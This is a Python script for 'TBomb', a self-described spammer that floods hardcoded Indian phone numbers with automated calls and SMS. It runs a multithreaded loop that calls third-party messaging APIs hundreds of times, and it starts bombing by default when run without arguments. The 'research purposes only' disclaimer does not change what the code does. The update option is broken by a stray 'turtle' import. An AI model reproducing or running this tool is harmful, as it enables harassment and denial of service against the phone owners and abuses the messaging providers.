import argparse
import os
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from turtle import update

from utils.provider import APIProvider
from utils.decorators import MessageDecorator

try:
    import requests
    from colorama import Fore, Style
except ImportError:
    print("\tSome dependencies could not be imported (possibly not installed)")
    print("Type `pip3 install -r requirements.txt` to install all required packages")
    sys.exit(1)

def clr():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")

def format_phone(num):
    return ''.join([n for n in num if n.isdigit()]).strip()

def workernode(mode, cc, target_numbers, count, delay, max_threads):
    api = APIProvider(cc, target_numbers[0], mode, delay=delay)
    clr()
    mesgdcrt.SectionMessage("Gearing up the Bomber - Please be patient")
    mesgdcrt.GeneralMessage("Target(s)        : " + ', '.join([cc + num for num in target_numbers]))
    mesgdcrt.GeneralMessage("Amount           : " + str(count))
    mesgdcrt.GeneralMessage("Threads          : " + str(max_threads) + " threads")
    mesgdcrt.GeneralMessage("Delay            : " + str(delay) + " seconds")
    mesgdcrt.WarningMessage("This tool was made for fun and research purposes only")
    print()

    success, failed = 0, 0
    while success < count:
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            jobs = []
            for target in target_numbers:
                for i in range(count-success):
                    jobs.append(executor.submit(api.hit))

            for job in as_completed(jobs):
                result = job.result()
                if result is None:
                    mesgdcrt.FailureMessage("Bombing limit for your target has been reached")
                    mesgdcrt.GeneralMessage("Try Again Later !!")
                    input(mesgdcrt.CommandMessage("Press [ENTER] to exit"))
                    sys.exit()
                if result:
                    success += 1
                else:
                    failed += 1
                clr()
                pretty_print(cc, target_numbers, success, failed)

    mesgdcrt.SuccessMessage("Bombing completed!")
    time.sleep(1.5)
    sys.exit()

def pretty_print(cc, target_numbers, success, failed):
    requested = success + failed
    mesgdcrt.SectionMessage("Bombing in progress - Please be patient")
    mesgdcrt.GeneralMessage("Target(s)     : " + ', '.join([cc + num for num in target_numbers]))
    mesgdcrt.GeneralMessage("Sent          : " + str(requested))
    mesgdcrt.GeneralMessage("Successful    : " + str(success))
    mesgdcrt.GeneralMessage("Failed        : " + str(failed))
    mesgdcrt.WarningMessage("This tool was made for fun and research purposes only")
    mesgdcrt.SuccessMessage("TBomb was created by SpeedX")

def get_phone_info():
    cc = "91"  # Always using country code 91
    target_numbers = ["9123456789","9234567888"]  # Hardcoded phone numbers
    return (cc, target_numbers)

def call_bombing():
    cc, target_numbers = get_phone_info()
    count = 100  # Hardcoded number of calls to send
    delay = 60  # Hardcoded delay for call bombing
    max_threads = 1  # Hardcoded number of threads for call bombing

    mesgdcrt.GeneralMessage("Starting Call Bombing...")

    workernode(mode="call", cc=cc, target_numbers=target_numbers, count=count, delay=delay, max_threads=max_threads)

def sms_bombing():
    cc, target_numbers = get_phone_info()
    count = 500  # Hardcoded number of SMS to send
    delay = 2  # Hardcoded delay for SMS bombing
    max_threads = 50  # Hardcoded number of threads for SMS bombing

    mesgdcrt.GeneralMessage("Starting SMS Bombing...")

    workernode(mode="sms", cc=cc, target_numbers=target_numbers, count=count, delay=delay, max_threads=max_threads)

def run_bombing():
    call_bombing()  # Perform call bombing first
    sms_bombing()  # After call bombing, perform SMS bombing

mesgdcrt = MessageDecorator("icon")
if sys.version_info[0] != 3:
    mesgdcrt.FailureMessage("TBomb will work only in Python v3")
    sys.exit()

__VERSION__ = "1.0"
__CONTRIBUTORS__ = ['SpeedX', 't0xic0der', 'scpketer', 'Stefan']

ALL_COLORS = [Fore.GREEN, Fore.RED, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN, Fore.WHITE]
RESET_ALL = Style.RESET_ALL

description = """TBomb - Your Friendly Spammer Application"""

parser = argparse.ArgumentParser(description=description)
parser.add_argument("-sms", "--sms", action="store_true", help="start TBomb with SMS Bomb mode")
parser.add_argument("-call", "--call", action="store_true", help="start TBomb with CALL Bomb mode")
parser.add_argument("-ascii", "--ascii", action="store_true", help="show only characters of standard ASCII set")
parser.add_argument("-u", "--update", action="store_true", help="update TBomb")
parser.add_argument("-c", "--contributors", action="store_true", help="show current TBomb contributors")
parser.add_argument("-v", "--version", action="store_true", help="show current TBomb version")

if __name__ == "__main__":
    args = parser.parse_args()
    if args.version:
        print("Version: ", __VERSION__)
    elif args.contributors:
        print("Contributors: ", " ".join(__CONTRIBUTORS__))
    elif args.update:
        update()
    else:
        run_bombing()  # Automatically start call bombing followed by SMS bombing
    sys.exit()
